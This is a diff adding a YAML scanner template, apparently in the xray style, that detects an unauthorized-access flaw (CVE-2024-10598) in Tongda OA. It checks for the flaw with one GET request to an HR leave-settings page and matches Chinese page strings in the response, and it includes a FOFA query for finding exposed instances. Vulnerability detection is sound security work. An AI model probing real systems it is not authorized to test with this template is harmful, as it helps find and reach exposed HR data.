@@ -1,0 +1,20 @@
+id: poc-yaml-tongda-oa-newleave-add-unauthorized-access
+info:
+  name: 通达OA newLeave/add.html 未授权访问(CVE-2024-10598)
+  severity: medium
+  tags:
+  - 两高一弱
+  - 未授权访问
+  - CVE-2024-10598
+  finger: 通达OA
+  fofa: app="TDXK-通达OA"
+requests:
+- method: GET
+  path: /general/hr/setting/attendance/newLeave/add.html
+  expression: "status_code == 200 && (\n  (\n  contains(gbk_decode(body),\"年假设置\"\
+    ) &&\n  contains(gbk_decode(body),\"年假基准设置\") &&\n  contains(gbk_decode(body),\"\
+    按入职日期计算\") &&\n  contains(gbk_decode(body),\"按自然年计算\")\n  ) || (\n  contains(body,\"\
+    年假设置\") &&\n  contains(body,\"年假基准设置\") &&\n  contains(body,\"按入职日期计算\") &&\n\
+    \  contains(body,\"按自然年计算\")\n  )\n)\n"
+variables: {}
+transport: http
